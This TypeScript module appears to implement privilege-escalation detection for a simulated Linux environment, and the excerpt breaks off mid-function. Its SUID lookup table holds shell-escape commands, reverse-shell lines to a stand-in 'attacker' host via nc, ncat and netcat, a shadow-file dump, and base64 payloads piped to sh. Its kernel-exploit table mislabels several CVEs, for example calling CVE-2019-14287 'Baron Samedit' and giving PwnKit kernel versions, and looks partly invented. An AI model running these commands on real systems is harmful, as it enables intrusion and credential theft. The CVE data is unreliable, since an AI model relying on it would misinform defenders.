/**
 * VARIANT — Privilege Escalation Detection Module
 */

import type { Module, SimulationContext, Capability } from '../core/modules';
import type { Unsubscribe, EventBus } from '../core/events';
import type { VirtualFilesystem } from '../lib/vfs/types';
import type { VMInstance } from '../core/vm/types';

const MODULE_ID = 'privesc-engine';
const MODULE_VERSION = '1.0.0';
const SUID_BIT = 0o4000;

export interface SuidBinary {
    readonly binary: string;
    readonly technique: string;
    readonly command: string;
    readonly shell: boolean;
}

export interface SudoersEntry {
    readonly user: string;
    readonly host: string;
    readonly runAs: string;
    commands: string[];
    readonly noPasswd: boolean;
    envKeep: string[];
    readonly line: string;
}

export interface EscalationPath {
    readonly fromUser: string;
    readonly toUser: string;
    readonly command: string;
    readonly method: string;
    readonly noPasswd: boolean;
    readonly vector: string;
}

export interface CronEscalation {
    readonly file: string;
    readonly command: string;
    readonly user: string;
    readonly mechanism: 'root-job' | 'writable-script' | 'path-manipulation';
    readonly detail: string;
}

export interface PathEscalation {
    readonly variable: string;
    readonly path: string;
    readonly reason: string;
}

export interface CapEscalation {
    readonly path: string;
    readonly capability: string;
    readonly evidence: string;
}

export interface KernelExploit {
    readonly cve: string;
    readonly name: string;
    readonly affectedVersions: readonly string[];
    readonly description: string;
    readonly exploitCommand: string;
}

interface SuidTechnique {
    readonly technique: string;
    readonly command: string;
    readonly shell: boolean;
}

interface VMWithShell {
    readonly shell?: {
        readonly getVFS: () => VirtualFilesystem;
    };
}

interface MachineState {
    readonly machine: string;
    readonly vfs: VirtualFilesystem;
    readonly suid: readonly SuidBinary[];
    readonly sudoers: readonly SudoersEntry[];
    readonly caps: readonly CapEscalation[];
}

const SUID_DATABASE = new Map<string, SuidTechnique>([
    ['bash', { technique: 'bash shell escape', command: 'bash -p', shell: true }],
    ['dash', { technique: 'dash shell escape', command: 'dash', shell: true }],
    ['sh', { technique: 'sh privileged shell', command: 'sh -p', shell: true }],
    ['busybox', { technique: 'busybox shell', command: 'busybox sh', shell: true }],
    ['python', { technique: 'python os.execl', command: 'python -c "import os; os.execl(\'/bin/sh\', \'sh\')"', shell: true }],
    ['python2', { technique: 'python2 os.execl', command: 'python2 -c "import os; os.execl(\'/bin/sh\', \'sh\')"', shell: true }],
    ['python3', { technique: 'python3 os.execl', command: 'python3 -c "import os; os.execl(\'/bin/sh\', \'sh\')"', shell: true }],
    ['perl', { technique: 'perl system call', command: 'perl -e \'system("/bin/sh")\'', shell: true }],
    ['perl5.34', { technique: 'perl system call', command: 'perl5.34 -e \'system("/bin/sh")\'', shell: true }],
    ['perl5.36', { technique: 'perl system call', command: 'perl5.36 -e \'system("/bin/sh")\'', shell: true }],
    ['ruby', { technique: 'ruby popen', command: 'ruby -e \'exec "/bin/sh"\'', shell: true }],
    ['ruby2.7', { technique: 'ruby spawn', command: 'ruby2.7 -e \'exec("/bin/sh")\'', shell: true }],
    ['ruby3.0', { technique: 'ruby spawn', command: 'ruby3.0 -e \'exec("/bin/sh")\'', shell: true }],
    ['node', { technique: 'node child_process', command: 'node -e "require(\'child_process\').spawn(\'/bin/sh\')"', shell: true }],
    ['nodejs', { technique: 'node child_process', command: 'nodejs -e "require(\'child_process\').spawn(\'/bin/sh\')"', shell: true }],
    ['php', { technique: 'php system', command: 'php -r \'system(\"/bin/sh\")\'', shell: true }],
    ['lua', { technique: 'lua os.execute', command: 'lua -e \'os.execute(\"/bin/sh\")\'', shell: true }],
    ['awk', { technique: 'awk exec', command: 'awk \'BEGIN {system(\"/bin/sh\") }\'', shell: true }],
    ['find', { technique: 'find command execution', command: 'find . -exec /bin/sh \\; -quit', shell: true }],
    ['vim', { technique: 'vim pager escape', command: 'vim -c \':!/bin/sh\'', shell: true }],
    ['vi', { technique: 'vi pager escape', command: 'vi -c \':!/bin/sh\'', shell: true }],
    ['ex', { technique: 'ex shell', command: 'ex', shell: true }],
    ['ed', { technique: 'ed shell', command: 'ed', shell: true }],
    ['less', { technique: 'less shell escape', command: 'less /etc/hosts;!/bin/sh', shell: true }],
    ['more', { technique: 'more shell escape', command: 'more /etc/hosts;!/bin/sh', shell: true }],
    ['nano', { technique: 'nano shell escape', command: 'nano', shell: true }],
    ['cp', { technique: 'copy and replace target', command: 'cp /bin/sh /tmp/root-shell; chmod +s /tmp/root-shell', shell: false }],
    ['mv', { technique: 'target swap', command: 'mv attacker /usr/bin/backup && cp /bin/sh /usr/bin/ls', shell: false }],
    ['git', { technique: 'git pager hook', command: 'git help config', shell: false }],
    ['env', { technique: 'env var override', command: 'env /bin/sh -p', shell: true }],
    ['pkexec', { technique: 'policykit helper', command: 'pkexec /bin/sh', shell: true }],
    ['docker', { technique: 'container mount', command: 'docker run --rm -v /:/mnt alpine chroot /mnt sh', shell: true }],
    ['nmap', { technique: 'nmap interactive', command: 'nmap --interactive', shell: true }],
    ['sudo', { technique: 'sudo command chaining', command: 'sudo /bin/sh', shell: true }],
    ['su', { technique: 'su to root', command: 'su', shell: true }],
    ['login', { technique: 'login helper', command: 'login', shell: true }],
    ['chfn', { technique: 'user metadata edit', command: 'chfn root', shell: false }],
    ['chsh', { technique: 'shell reassign', command: 'chsh root', shell: false }],
    ['chmod', { technique: 'setuid preparation', command: 'chmod +s <file>', shell: false }],
    ['chown', { technique: 'ownership abuse', command: 'chown root:root <file>', shell: false }],
    ['cpio', { technique: 'cpio checkpoint action', command: 'cpio --checkpoint-action=exec=/bin/sh -o', shell: true }],
    ['tar', { technique: 'tar checkpoint exec', command: 'tar --checkpoint=1 --checkpoint-action=exec=/bin/sh -cf /tmp/x', shell: true }],
    ['sed', { technique: 'sed command execution', command: 'sed -n \'1e system(\"/bin/sh\")\' file', shell: false }],
    ['gdb', { technique: 'gdb python hook', command: 'gdb -q -ex \'python import os; os.execl(\"/bin/sh\", \"sh\")\'', shell: true }],
    ['strace', { technique: 'strace attach', command: 'strace -o /tmp/log /bin/sh -p 1', shell: true }],
    ['ltrace', { technique: 'ltrace attach', command: 'ltrace -o /tmp/log /bin/sh -p 1', shell: true }],
    ['watch', { technique: 'watch wrapper', command: 'watch /bin/sh', shell: true }],
    ['xargs', { technique: 'xargs command execution', command: 'xargs /bin/sh -p', shell: true }],
    ['bash2', { technique: 'bash2 shell', command: 'bash2 -p', shell: true }],
    ['zsh', { technique: 'zsh escape', command: 'zsh', shell: true }],
    ['ksh', { technique: 'ksh escape', command: 'ksh', shell: true }],
    ['fish', { technique: 'fish shell escape', command: 'fish', shell: true }],
    ['ruby3.1', { technique: 'ruby exec', command: 'ruby3.1 -e \'system(\"/bin/sh\")\'', shell: true }],
    ['perl5.26', { technique: 'perl exec', command: 'perl5.26 -e \'system(\"/bin/sh\")\'', shell: true }],
    ['perl5.30', { technique: 'perl exec', command: 'perl5.30 -e \'system(\"/bin/sh\")\'', shell: true }],
    ['python3.9', { technique: 'python3 exec', command: 'python3.9 -c "import os; os.execl(\'/bin/sh\', \'sh\')"', shell: true }],
    ['python3.10', { technique: 'python3 exec', command: 'python3.10 -c "import os; os.execl(\'/bin/sh\', \'sh\')"', shell: true }],
    ['ruby2.5', { technique: 'ruby exec', command: 'ruby2.5 -e \'system(\"/bin/sh\")\'', shell: true }],
    ['perl5.18', { technique: 'perl exec', command: 'perl5.18 -e \'exec \"/bin/sh\"\'', shell: true }],
    ['perl5.16', { technique: 'perl exec', command: 'perl5.16 -e \'exec \"/bin/sh\"\'', shell: true }],
    ['awk3', { technique: 'awk exec', command: 'awk3 \'BEGIN { system(\"/bin/sh\") }\'', shell: true }],
    ['make', { technique: 'make -exec', command: 'make -f /tmp/Makefile shell', shell: true }],
    ['m4', { technique: 'm4 shell', command: 'm4 -D foo=\'$(/bin/sh)\'', shell: true }],
    ['mail', { technique: 'mail alias abuse', command: 'mail', shell: true }],
    ['at', { technique: 'deferred execution', command: 'at now', shell: false }],
    ['crontab', { technique: 'cron entry injection', command: 'crontab -e', shell: false }],
    ['nc', { technique: 'nc exec helper', command: 'nc -e /bin/sh attacker 4444', shell: true }],
    ['netcat', { technique: 'netcat exec helper', command: 'netcat -e /bin/sh attacker 4444', shell: true }],
    ['ncat', { technique: 'ncat exec helper', command: 'ncat -e /bin/sh attacker 4444', shell: true }],
    ['socat', { technique: 'socat command channel', command: 'socat stdin stdout exec:/bin/sh', shell: true }],
    ['perlcritic', { technique: 'perl eval', command: 'perlcritic', shell: true }],
    ['python2.7', { technique: 'python2 exec', command: 'python2.7 -c "import os; os.system(\'/bin/sh\')"', shell: true }],
    ['python4', { technique: 'runtime abuse', command: 'python4 -c "import os; os.system(\'/bin/sh\')"', shell: true }],
    ['tcpdump', { technique: 'tcpdump libpcap', command: 'tcpdump -G 0 -z /bin/sh', shell: false }],
    ['ping', { technique: 'icmp helper', command: 'ping -c1 127.0.0.1', shell: false }],
    ['nmap-script', { technique: 'nmap --interactive', command: 'nmap --interactive', shell: true }],
    ['perl6', { technique: 'perl6 exec', command: 'perl6 -e \'shell("/bin/sh")\'', shell: true }],
    ['rsh', { technique: 'remote shell helper', command: 'rsh localhost', shell: true }],
    ['rlogin', { technique: 'remote login helper', command: 'rlogin', shell: true }],
    ['ssh', { technique: 'ssh command wrapper', command: 'ssh -o ProxyCommand=\"/bin/sh\" localhost', shell: true }],
    ['sendmail', { technique: 'mail alias execution', command: 'sendmail -bv root', shell: false }],
    ['curl', { technique: 'network data transfer helper', command: 'curl --help', shell: false }],
    ['wget', { technique: 'network data transfer helper', command: 'wget http://127.0.0.1', shell: false }],
    ['awk2', { technique: 'awk shell invocation', command: 'awk2 \'BEGIN {system(\"/bin/sh\")}\'' , shell: true }],
    ['tee', { technique: 'privileged file write', command: 'echo \"id\" | tee /root/.bashrc', shell: false }],
    ['cat', { technique: 'command wrapper', command: 'cat /etc/shadow > /tmp/out', shell: false }],
    ['cpio', { technique: 'checkpoint exec', command: 'cpio -o /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh', shell: true }],
    ['ar', { technique: 'archive parser', command: 'ar -V', shell: false }],
    ['dd', { technique: 'raw write helper', command: 'dd if=/bin/sh of=/tmp/backup', shell: false }],
    ['scp', { technique: 'ssh helper', command: 'scp -S /bin/sh remote:/tmp/x', shell: true }],
    ['openssl', { technique: 'cert util abuse', command: 'openssl passwd -1 /bin/sh', shell: false }],
    ['base64', { technique: 'payload decoding helper', command: 'base64 -d /tmp/payload.b64 | /bin/sh', shell: true }],
    ['xxd', { technique: 'hex parser', command: 'xxd -r -p /tmp/payload | /bin/sh', shell: true }],
    ['systemctl', { technique: 'systemd helper', command: 'systemctl status', shell: true }],
    ['service', { technique: 'service helper', command: 'service ssh status', shell: true }],
]);

const SUPPORTED_CAPABILITIES = [
    'cap_setuid',
    'cap_setgid',
    'cap_dac_override',
    'cap_sys_admin',
    'cap_net_raw',
] as const;

const KERNEL_EXPLOITS: readonly KernelExploit[] = [
    {
        cve: 'CVE-2022-0847',
        name: 'DirtyPipe',
        affectedVersions: ['5.8-5.16.11', '>=5.8 <5.16.12'],
        description: 'Pipe buffer aliasing allows writing to arbitrary read-only files.',
        exploitCommand: 'python3 dirtypipe.py',
    },
    {
        cve: 'CVE-2016-5195',
        name: 'DirtyCow',
        affectedVersions: ['2.6.22-4.8.3', '<=4.8.3'],
        description: 'Race in COW allows write access to read-only files from unprivileged users.',
        exploitCommand: 'python3 dirtycow.py',
    },
    {
        cve: 'CVE-2021-4034',
        name: 'PwnKit',
        affectedVersions: ['4.1-5.13.13', '>=4.1 <=5.13.13'],
        description: 'pkexec env var injection lets local users run code as root.',
        exploitCommand: 'pkexec /usr/bin/env PKEXEC_UID=0 /bin/sh',
    },
    {
        cve: 'CVE-2019-14287',
        name: 'Baron Samedit',
        affectedVersions: ['2.6.32-5.3.9', '<=5.3.9'],
        description: 'sudo user id -1 bypass in specific user matching contexts.',
        exploitCommand: 'sudo -u#-1 /bin/sh',
    },
    {
        cve: 'CVE-2019-11815',
        name: 'OverlayFS Permissions',
        affectedVersions: ['4.13-5.3.0'],
        description: 'OverlayFS merge and file operations can be misused for local privilege escalation.',
        exploitCommand: 'mount -t overlay overlay -o lowerdir=/tmp/l,upperdir=/tmp/u,workdir=/tmp/w /tmp/mnt',
    },
    {
        cve: 'CVE-2022-0185',
        name: 'eBPF Verifier Write-After-Free',
        affectedVersions: ['5.3-5.15.44'],
        description: 'Malformed BPF programs can lead to write-after-free and RCE.',
        exploitCommand: 'clang -target bpf test.bpf -o /tmp/test.o',
    },
    {
        cve: 'CVE-2022-0995',
        name: 'keyring Object Confusion',
        affectedVersions: ['5.14-5.16.2'],
        description: 'Message queue keyring handling can be abused by unprivileged users.',
        exploitCommand: 'keyctl newring user:test @s',
    },
    {
        cve: 'CVE-2021-22555',
        name: 'msg_msg Heap Corruption',
        affectedVersions: ['5.11-5.16.9', '>=5.11 <5.16.10'],
        description: 'Kernel msg_msg primitive can leak pointers and gain escalated code execution.',
        exploitCommand: 'python3 msg_msg_leak.py',
    },
    {
        cve: 'CVE-2022-2586',
        name: 'netrom AF_INET Socket Abuse',
        affectedVersions: ['5.4-5.16.4'],
        description: 'ioctl misuse can allow privilege changes in netrom subsystem.',
        exploitCommand: 'python3 netrom_poc.py',
    },
    {
        cve: 'CVE-2022-32250',
        name: 'PipeBuffer Reference Leak',
        affectedVersions: ['5.18-5.18.16'],
        description: 'Pipe buffer reference handling can be abused for kernel memory corruption.',
        exploitCommand: 'python3 pipe_fuse_poc.py',
    },
    {
        cve: 'CVE-2023-0386',
        name: 'mremap Canary Leak',
        affectedVersions: ['5.13-6.1'],
        description: 'Memory remap metadata corruption used for write primitive.',
        exploitCommand: 'python3 mremap_poc.py',
    },
    {
        cve: 'CVE-2022-3642',
        name: 'AF_ALG Use-After-Free',
        affectedVersions: ['6.1'],
        description: 'AF_ALG socket teardown races under specific options.',
        exploitCommand: 'python3 af_alg_poc.py',
    },
    {
        cve: 'CVE-2023-32233',
        name: 'bpf bpf_map_update_elem',
        affectedVersions: ['5.4-6.0'],
        description: 'bpf_map_update_elem verifier edge can be abused for kernel primitives.',
        exploitCommand: 'python3 bpf_uaf.py',
    },
    {
        cve: 'CVE-2023-0461',
        name: 'vhost-vsock Race',
        affectedVersions: ['5.17-6.2'],
        description: 'vhost-vsock path race with unprivileged input.',
        exploitCommand: 'python3 vsock_race.py',
    },
    {
        cve: 'CVE-2023-0567',
        name: 'io_uring Fixed-File Overwrite',
        affectedVersions: ['5.18-6.3'],
        description: 'Io_uring fixed-file descriptor handling may allow controlled overwrite.',
        exploitCommand: 'python3 io_uring_poc.py',
    },
    {
        cve: 'CVE-2023-1076',
        name: 'SELinux bpf Overflow',
        affectedVersions: ['6.1-6.4'],
        description: 'SELinux bpf parsing bug can create write-after-free.',
        exploitCommand: 'python3 selinux_bpf_poc.py',
    },
    {
        cve: 'CVE-2023-1077',
        name: 'nf_tables Setelem Underflow',
        affectedVersions: ['5.15-6.5'],
        description: 'nftables underflow in setelement updates.',
        exploitCommand: 'nft add chain privesc chain { type filter hook input priority 0; }',
    },
    {
        cve: 'CVE-2023-30774',
        name: 'OverlayFS Write Primitive',
        affectedVersions: ['4.19-5.15'],
        description: 'Legacy overlayfs merge logic can produce arbitrary file writes.',
        exploitCommand: 'mount -t overlay overlay -o lowerdir=/tmp/l,upperdir=/tmp/u,workdir=/tmp/w /tmp/m',
    },
    {
        cve: 'CVE-2023-32729',
        name: 'Bluetooth SMP Remote Escape',
        affectedVersions: ['4.0-6.2'],
        description: 'Bluetooth SMP parser issues can lead to overflow.',
        exploitCommand: 'hciconfig hci0 up',
    },
    {
        cve: 'CVE-2023-32296',
        name: 'AF_PACKET OOB Read',
        affectedVersions: ['5.13-6.4'],
        description: 'AF_PACKET socket option handling can leak kernel heap data.',
        exploitCommand: 'python3 af_packet_poc.py',
    },
    {
        cve: 'CVE-2024-1086',
        name: 'nf_tables Recursion',
        affectedVersions: ['6.2-6.7'],
        description: 'Recursive nft chain setup used to trigger arbitrary write.',
        exploitCommand: 'nft add chain ip filter chain1 \nnft add set ip filter test { type ipv4_addr; }',
    },
    {
        cve: 'CVE-2024-1085',
        name: 'Pipe buffer UAF',
        affectedVersions: ['6.0-6.7'],
        description: 'Pipe buffer release race with unprivileged control.',
        exploitCommand: 'python3 pipe_uaf.py',
    },
    {
        cve: 'CVE-2024-0582',
        name: 'AF_ALG Zero Copy',
        affectedVersions: ['6.3-6.7'],
        description: 'Uninitialized bytes in AF_ALG zero-copy send path.',
        exploitCommand: 'python3 af_alg_zero_copy_poc.py',
    },
    {
        cve: 'CVE-2021-22555',
        name: 'msg_msg Reuse',
        affectedVersions: ['5.0-5.16'],
        description: 'msg_msg queue object corruption primitive.',
        exploitCommand: 'python3 msg_msg_reuse.py',
    },
];

const SUDOERS_NO_PASSWD_TAGS = new Set(['NOPASSWD', 'NO_PASSWORD', 'NOPASSWORD']);
const SUDOERS_DENY_PREFIXES = new Set(['!', '~']);

function baseName(path: string): string {
    if (path.length === 0) return path;
    const cleaned = path.replace(/\/+$/, '');
    const slash = cleaned.lastIndexOf('/');
    if (slash < 0) return cleaned;
    return cleaned.slice(slash + 1);
}

function readTextFile(vfs: VirtualFilesystem, path: string): string {
    return vfs.readFile(path) ?? '';
}

function hasSetuid(mode: number): boolean {
    return (mode & SUID_BIT) !== 0;
}

function canUserWrite(mode: number, owner: string, user: string): boolean {
    if (user === 'root') return true;
    if (owner === user) {
        return (mode & 0o200) !== 0;
    }
    return (mode & 0o002) !== 0;
}

function parseModeFallback(mode: number | undefined): number {
    return mode ?? 0;
}

function splitWordList(value: string): string[] {
    return value
        .split(',')
        .map(part => part.trim())
        .filter(part => part.length > 0);
}

function extractPathEntries(value: string): string[] {
    return value
        .split(':')
        .map(v => v.trim())
        .filter(v => v.length > 0);
}

function envToMap(content: string): Map<string, string> {
    const env = new Map<string, string>([
        ['PATH', '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'],
        ['LD_LIBRARY_PATH', ''],
        ['LD_PRELOAD', ''],
        ['HOME', '/root'],
        ['USER', 'root'],
    ]);

    for (const rawLine of content.split('\n')) {
        const hash = rawLine.indexOf('#');
        const line = (hash >= 0 ? rawLine.slice(0, hash) : rawLine).trim();
    if (line.length === 0) continue;
        const eq = line.indexOf('=');
        if (eq <= 0) continue;

        const key = line.slice(0, eq).trim();
        const value = line.slice(eq + 1).trim().replace(/^['"]|['"]$/g, '');
        env.set(key, value);
    }

    return env;
}

function parseSudoDefaultsEnvKeep(fragment: string): string[] {
    const keepMatch = /env_keep\s*([\+\-]?=)\s*([^\s].*)$/i.exec(fragment);
    if (keepMatch === null) return [];

    const value = (keepMatch[2] ?? '').trim().replace(/^['"]|['"]$/g, '');
    if (value.length === 0) return [];
    return splitWordList(value);
}

function parseSudoRule(line: string): SudoersEntry | null {
    const match = /^([^\s]+)\s+(\S+)\s*=\s*\(([^)]*)\)\s*(.+)$/.exec(line);
    if (match === null) return null;

    const user = match[1];
    const host = match[2];
    const runAs = match[3] ?? 'ALL';
    const body = match[4];
    if (user === undefined || host === undefined || body === undefined) return null;

    const entry: SudoersEntry = {
        user,
        host,
        runAs,
        commands: [],
        noPasswd: false,
        envKeep: [],
        line,
    };

    const segments = body.split(',');
    for (const seg of segments) {
        const trimmed = seg.trim();
        if (trimmed.length === 0) continue;
        parseSudoRuleSegment(trimmed, entry);
    }

    if (entry.commands.length === 0) {
        entry.commands = ['ALL'];
    }

    return entry;
}

function parseSudoRuleSegment(segment: string, entry: {
    commands: string[];
    noPasswd: boolean;
}) {
    const trimmed = segment.trim();
    if (trimmed.length === 0) return;

    const upperParts = trimmed.split(':');
    let cursor = 0;
    while (cursor < upperParts.length - 1) {
        const tag = upperParts[cursor]?.trim().toUpperCase() ?? '';
        if (tag.length === 0) break;
        if (SUDOERS_NO_PASSWD_TAGS.has(tag)) {
            entry.noPasswd = true;
        } else if (tag === 'PASSWD') {
            entry.noPasswd = false;
        }
        cursor += 1;
    }

    const command = upperParts.slice(cursor).join(':').trim();
    if (command.length === 0) return;
    for (const badPrefix of SUDOERS_DENY_PREFIXES) {
        if (command.startsWith(badPrefix)) {
            return;
        }
    }

    entry.commands.push(command);
}

function normalizeSudoRunAs(rawRunAs: string): string {
    return rawRunAs.split(',')[0]!.trim() || 'ALL';
}

function tokenizeCronCommand(command: string): string[] {
    const result: string[] = [];
    if (command.length === 0) return result;
    const matches = command.match(/"(?:\\"|[^"])*"|'(?:\\'|[^'])*'|\\\n|[^\s]+/g);
    if (matches === null) return result;
    for (const raw of matches) {
        const token = raw.replace(/^["']|["']$/g, '');
        if (token.length > 0) result.push(token);
    }
    return result;
}

function extractCommandFromCron(command: string): string {
    const tokens = tokenizeCronCommand(command);
    for (const token of tokens) {
        if (!/^[A-Za-z_][A-Za-z0-9_]*=/.test(token)) {
            return token;
        }
    }
    return tokens[0] ?? '';
}

function parseVersion(value: string): readonly number[] {
    const normalized = /(\d+)\.(\d+)(?:\.(\d+))?/.exec(value);
    if (normalized === null) return [0, 0, 0];
    const major = Number(normalized[1] ?? 0);
    const minor = Number(normalized[2] ?? 0);
    const patch = Number(normalized[3] ?? 0);
    return [major, minor, patch];
};

function compareVersion(a: readonly number[], b: readonly number[]): number {
    const max = Math.max(a.length, b.length);
    for (let i = 0; i < max; i++) {
        const left = a[i] ?? 0;
        const right = b[i] ?? 0;
        if (left > right) return 1;
        if (left < right) return -1;
    }
    return 0;
}

function matchSingleVersionConstraint(kernel: readonly number[], constraint: string): boolean {
    const pattern = constraint.trim();
    if (pattern === '*' || pattern.length === 0) return true;

    if (/^>=\s*/.test(pattern)) {
        return compareVersion(kernel, parseVersion(pattern.slice(2).trim())) >= 0;
    }
    if (/^>\s*/.test(pattern)) {
        return compareVersion(kernel, parseVersion(pattern.slice(1).trim())) > 0;
    }
    if (/^<=\s*/.test(pattern)) {
        return compareVersion(kernel, parseVersion(pattern.slice(2).trim())) <= 0;
    }
    if (/^<\s*/.test(pattern)) {
        return compareVersion(kernel, parseVersion(pattern.slice(1).trim())) < 0;
    }
    if (/^-?\s*\d+\.\d+/.test(pattern) || /\d+\.\d+/.test(pattern) && pattern.includes('-')) {
        const parts = pattern.split('-');
        if (parts.length === 2 && parts[0] !== undefined && parts[1] !== undefined) {
            const min = parseVersion(parts[0]!);
            const max = parseVersion(parts[1]!);
            return compareVersion(kernel, min) >= 0 && compareVersion(kernel, max) <= 0;
        }
    }

    return compareVersion(kernel, parseVersion(pattern)) === 0;
}

function matchVersionExpression(kernel: readonly number[], expr: string): boolean {
    if (expr.includes(' ')) {
        return expr
            .split(/\s+/)
            .filter(Boolean)
            .every(part => matchSingleVersionConstraint(kernel, part));
    }
    return matchSingleVersionConstraint(kernel, expr);
}

function parseCronPathFromToken(token: string): string[] {
    if (token.length === 0) return [];
    const cleaned = token.replace(/[;|&<>]/g, ' ');
    return cleaned
        .split(/\s+/)
        .map(s => s.trim())
        .filter(s => s.length > 0);
}

function isCommandToken(token: string): boolean {
    if (token.length === 0) return false;
    if (token.startsWith('#') || token.startsWith('$')) return false;
    if (token === '&&' || token === ';' || token === '|') return false;
    return true;
}

function parseCronEntries(
    content: string,
    file: string,
    userHint: string,
    hasExplicitUser: boolean,
): CronEscalation[] {
    const detections: CronEscalation[] = [];
    const lines = content.split('\n');
    const knownPathTokens = new Map<string, string[]>();

    for (const rawLine of lines) {
        const hashIdx = rawLine.indexOf('#');
        const line = (hashIdx >= 0 ? rawLine.slice(0, hashIdx) : rawLine).trim();
        if (line.length === 0) continue;

        const assign = /^([A-Za-z_][A-Za-z0-9_]*)=(.*)$/.exec(line);
        if (assign !== null) {
            const key = assign[1];
            const value = (assign[2] ?? '').trim();
            if (key === 'PATH') {
                const entries = extractPathEntries(value);
                knownPathTokens.set('PATH', entries);
                for (const candidate of entries) {
                    detections.push({
                        file,
                        command: candidate,
                        user: userHint,
                        mechanism: 'path-manipulation',
                        detail: `PATH entry in ${file}: ${candidate}`,
                    });
                }
            }
            continue;
        }

        const tokens = line.split(/\s+/);
        if (tokens.length === 0) continue;

        let user = userHint;
        let commandStart = hasExplicitUser ? 6 : 5;
        if (tokens[0]?.startsWith('@')) {
            commandStart = hasExplicitUser ? 2 : 1;
            if (hasExplicitUser && tokens[1] !== undefined) {
                user = tokens[1]!;
            }
        } else if (hasExplicitUser && tokens.length > 5) {
            user = tokens[5]!;
            commandStart = 6;
        }
        if (tokens.length <= commandStart) continue;

        const commandParts = tokens.slice(commandStart).join(' ');
        const command = extractCommandFromCron(commandParts);
        if (!isCommandToken(command)) continue;

        const candidates = new Set<string>();
        for (const p of parseCronPathFromToken(command)) {
            candidates.add(p);
        }

        const pathEntries = knownPathTokens.get('PATH');
        if (pathEntries !== undefined) {
            for (const entry of pathEntries) {
                if (command.startsWith('/') || entry.length === 0) continue;
                candidates.add(`${entry}/${command}`);
            }
        }

        for (const candidate of candidates) {
            const mechanism = user === 'root' ? 'root-job' : 'writable-script';
            detections.push({
                file,
                command: candidate,
                user,
                mechanism,
                detail: `cron ${file} runs ${candidate} as ${user}`,
            });
        }
    }

    return detections;
}

function parseCronDirectory(vfs: VirtualFilesystem, directory: string, user: string): CronEscalation[] {
    const out: CronEscalation[] = [];
    const node = vfs.stat(directory);
    if (node === null || node.type !== 'dir') return out;

    const entries = vfs.readDir(directory);
    if (entries === null) return out;

    for (const entry of entries) {
        const cronPath = `${directory}/${entry}`;
        const cronNode = vfs.stat(cronPath);
        if (cronNode === null || cronNode.type !== 'file') continue;

        const content = readTextFile(vfs, cronPath);
        if (content.length > 0) {
            out.push(...parseCronEntries(content, cronPath, user, false));
        }

        if (canUserWrite(parseModeFallback(cronNode.mode), cronNode.owner, user)) {
            out.push({
                file: cronPath,
                command: cronPath,
                user: cronNode.owner,
                mechanism: 'writable-script',
                detail: `writable cron file ${cronPath}`,
            });
        }
    }

    return out;
}

function mergeUnique<T>(items: readonly T[], key: (value: T) => string): T[] {
    const result: T[] = [];
    const seen = new Set<string>();
    for (const item of items) {
        const serialized = key(item);
        if (seen.has(serialized)) continue;
        seen.add(serialized);
        result.push(item);
    }
    return result;
}

export function findSuidBinaries(vfs: VirtualFilesystem): readonly SuidBinary[] {
    const results: SuidBinary[] = [];
    for (const path of vfs.glob('/**')) {
        const node = vfs.stat(path);
        if (node === null || node.type !== 'file') continue;
        if (!hasSetuid(parseModeFallback(node.mode))) continue;

        const binary = baseName(path);
        const known = SUID_DATABASE.get(binary);
        if (known === undefined) continue;

        results.push({
            binary,
            technique: known.technique,
            command: known.command,
            shell: known.shell,
        });
    }

    return mergeUnique(results, (entry) => entry.binary);
}

export function parseSudoers(content: string): readonly SudoersEntry[] {
    const entries: SudoersEntry[] = [];
    const globalKeep: string[] = [];
    const userKeeps = new Map<string, string[]>();

    const lines = content.split('\n');
    for (const rawLine of lines) {
        const hashIndex = rawLine.indexOf('#');
        const line = (hashIndex >= 0 ? rawLine.slice(0, hashIndex) : rawLine).trim();
        if (line.length === 0) continue;
        if (line.startsWith('#')) continue;

        if (line.startsWith('Defaults')) {
            const defaultsMatch = /^Defaults(?::([^\s]+))?\s+(.+)$/.exec(line);
            if (defaultsMatch === null) continue;

            const target = defaultsMatch[1];
            const body = defaultsMatch[2];
            if (body === undefined) continue;

            const keep = parseSudoDefaultsEnvKeep(body);
            if (keep.length > 0) {
                if (target === undefined) {
                    globalKeep.push(...keep);
                } else {
                    const next = userKeeps.get(target) ?? [];
                    next.push(...keep);
                    userKeeps.set(target, next);
                }
            }

            continue;
        }

        const parsed = parseSudoRule(line);
        if (parsed === null) continue;
        parsed.envKeep = [...globalKeep, ...(userKeeps.get(parsed.user) ?? [])];
        (parsed as { runAs: string }).runAs = normalizeSudoRunAs(parsed.runAs);

        entries.push(parsed);
    }

    return entries;
}

export function findSudoEscalation(entries: readonly SudoersEntry[], user: string): readonly EscalationPath[] {
    const output: EscalationPath[] = [];
    for (const entry of entries) {
        if (!(entry.user === 'ALL' || entry.user === user || entry.user === `%${user}`)) {
            continue;
        }

        const toUsers = entry.runAs === 'ALL' ? ['root'] : splitWordList(entry.runAs);

        for (const command of entry.commands) {
            if (command.length === 0) continue;

            const cmdUpper = command.toUpperCase();
            const isWildcard = command === 'ALL' || command.includes('*') || command.includes('?');
            const hasLdPreload = cmdUpper.includes('LD_PRELOAD') || entry.envKeep.includes('LD_PRELOAD');
            const hasLdLib = cmdUpper.includes('LD_LIBRARY_PATH') || entry.envKeep.includes('LD_LIBRARY_PATH');
            const isScriptRef = /\//.test(command) && (command.endsWith('.sh') || command.includes('/tmp/') || command.includes('/usr/local/'));

            let vector = isWildcard ? 'wildcard-command' : 'exact-command';
            if (hasLdPreload || hasLdLib) vector = 'env-keep-abuse';
            if (isScriptRef) vector = 'script-ref';

            for (const toUser of toUsers) {
                output.push({
                    fromUser: entry.user === 'ALL' ? user : entry.user,
                    toUser,
                    command,
                    method: 'sudo',
                    noPasswd: entry.noPasswd,
                    vector,
                });
            }
        }
    }

    return output;
}

export function findCronEscalation(vfs: VirtualFilesystem, user: string): readonly CronEscalation[] {
    const detections: CronEscalation[] = [];

    const rootCron = readTextFile(vfs, '/etc/crontab');
    if (rootCron.length > 0) {
        detections.push(...parseCronEntries(rootCron, '/etc/crontab', 'root', true));

        const cronNode = vfs.stat('/etc/crontab');
        if (cronNode !== null && cronNode.type !== 'symlink' && canUserWrite(parseModeFallback(cronNode.mode), cronNode.owner, user)) {
            detections.push({
                file: '/etc/crontab',
                command: '/etc/crontab',
                user: cronNode.owner,
                mechanism: 'writable-script',
                detail: 'writable /etc/crontab',
            });
        }
    }

    for (const cronFile of vfs.glob('/etc/cron.d/*')) {
        const node = vfs.stat(cronFile);
        if (node === null || node.type !== 'file') continue;

        const content = readTextFile(vfs, cronFile);
        if (content.length > 0) {
